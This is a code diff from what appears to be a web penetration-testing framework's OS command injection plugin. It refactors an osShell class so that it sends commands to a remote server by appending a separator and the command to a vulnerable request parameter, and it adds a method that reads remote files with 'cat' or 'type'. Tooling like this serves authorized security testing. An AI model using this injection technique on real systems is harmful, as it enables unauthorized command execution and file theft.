@@ -228,8 +228,22 @@ class osCommandingShell(baseAttackPlugin):
         '''
 
 class osShell(shell):
-    def _rexec( self, command ):
-        # Lets send the command.
+    def specific_user_input( self, command ):
+        '''
+        This method is called when a user writes a command in the shell and hits enter.
+        
+        Before calling this method, the framework calls the generic_user_input method
+        from the shell class.
+
+        @parameter command: The command to handle ( ie. "read", "exec", etc ).
+        @return: The result of the command.
+        '''
+        pass
+    
+    def execute(self, command):
+        '''
+        Send a command to the remote server, where it's going to be executed.
+        '''
         functionReference = getattr( self._urlOpener , self.getMethod() )
         exploitDc = self.getDc()
         exploitDc[ self.getVar() ] = self['separator'] + command
@@ -239,6 +253,15 @@ class osShell(shell):
             return 'Error "' + str(e) + '" while sending command to remote host. Please try again.'
         else:
             return self._cut( response.getBody() )
+        
+    def read(self, filename):
+        '''
+        Read a file in the remote server by running "cat" or "type" depending
+        on the identified OS.
+        '''
+        read_command_format = self.get_read_command()
+        read_command = read_command_format % (filename,)
+        return self.execute( read_command )
     
     def end( self ):
         om.out.debug('osShell cleanup complete.')
